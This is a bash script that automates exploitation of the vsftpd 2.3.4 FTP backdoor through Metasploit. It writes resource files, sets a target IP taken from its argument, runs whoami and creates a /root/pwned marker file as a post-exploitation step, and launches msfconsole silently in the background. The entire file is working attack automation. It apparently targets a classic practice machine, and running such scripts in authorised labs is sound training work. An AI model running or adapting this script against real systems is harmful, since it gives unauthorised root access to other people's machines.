#!/bin/bash

targetIpAddress=$1
msfScriptPath=/tmp/insideMsf

mkdir -p $msfScriptPath

generatePostExploitationScript() {
	cat <<EOF > $msfScriptPath/payload.rc
	whoami
	touch /root/pwned
	exit
EOF
}

generateMetasploitResource() {
	cat <<EOF > $msfScriptPath/vsftpd.rc
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST $targetIpAddress
    set AutoRunScript $msfScriptPath/payload.rc
    run
    exit
EOF
}

main() {
    echo "[!] Starting Exploitation Script..."
    sleep 2

    echo "[!] Generating Metasploit Resources..."
    generateMetasploitResource
    echo "[!] Generating Post Exploitations Resources..."
    generatePostExploitationScript

    echo "[!] Exploiting Vulnerable FTP Service On $targetIpAddress]"
    msfconsole -r $msfScriptPath/vsftpd.rc &> /dev/null &

    echo "[!] Exploitation Finished!"
}

main